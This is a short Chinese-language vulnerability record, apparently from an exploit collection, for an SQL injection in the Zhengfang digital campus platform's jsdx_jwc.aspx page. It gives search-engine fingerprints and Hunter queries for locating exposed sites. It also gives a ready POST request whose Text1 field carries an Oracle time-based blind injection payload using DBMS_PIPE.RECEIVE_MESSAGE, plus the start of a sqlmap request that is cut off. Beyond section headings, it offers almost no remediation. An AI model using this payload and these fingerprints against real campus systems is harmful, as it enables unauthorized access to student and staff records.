# 正方数字化校园平台jsdx_jwc存在SQL注入漏洞

- **系统**：正方数字化校园平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="正方数字化校园信息门户"`
- **请求**：`GET /jsdx_jwc.aspx?url=js_jxrw.aspx&usertype=1 HTTP/1.1`

**请求体 / payload**
```
1. 获取`__VIEWSTATE`
Host:
2. 使用获取的`__VIEWSTATE`替换测试注入
POST /jsdx_jwc.aspx?url=js_jxrw.aspx&usertype=1 HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Cookie: ASP.NET_SessionId=y40w2d454fi1155532uqfx45
Content-Length: 132
__VIEWSTATE=dDw1ODA1MTY0Nzs7PuxuvqiSIrs3wcYFy1qakqRKiR1M&__VIEWSTATEGENERATOR=&Text1=123%27+AND+1655%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28107%29%7C%7CCHR%28103%29%7C%7CCHR%2877%29%7C%7CCHR%2890%29%2C5%29+AND+%27nBHe%27%3D%27nBHe&Text2=admin&Button1=%E7%99%BB %E5%BD%95

sqlmap
POST /jsdx_jwc.aspx?url=js_jxrw.aspx&usertype=1 HTTP/1.1
Host:
Content-Type: application…（脚本共 869 字，完整版见原文）
```

**其他**
- 正方数字化校园平台jsdx\_jwc存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 四、漏洞复现
***
- 版本: * hunter`(web.title="正方数字化校园信息门户" ｜ web.title="数字化校园信息门户" ｜ web.title="统一身份认证中心")&&web.body="正方"`、<code>web.body="zfca/login"&&web.body="login_bg"</code>
* 特征